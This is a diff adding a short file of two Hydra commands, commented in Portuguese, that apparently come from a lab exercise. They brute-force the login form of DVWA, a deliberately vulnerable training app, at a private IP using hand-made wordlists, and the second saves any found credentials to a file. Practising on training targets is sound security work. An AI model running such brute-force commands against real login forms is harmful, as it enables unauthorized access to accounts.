@@ -1,0 +1,7 @@
+#Brute force com Wordlist criada manualmente para forçar login no formulario de Login do DVWA
+hydra -L users.txt -P passwd.txt 192.168.50.109 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -v -t 10 -f
+
+#Comando usado pra criar arquivo de documentacao para login e senha do Formulario de Login do DVWA
+hydra -L users.txt -P passwd.txt 192.168.50.109 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -v -t 40 -f | grep "host:" > resultado_login_DVWA
+
+
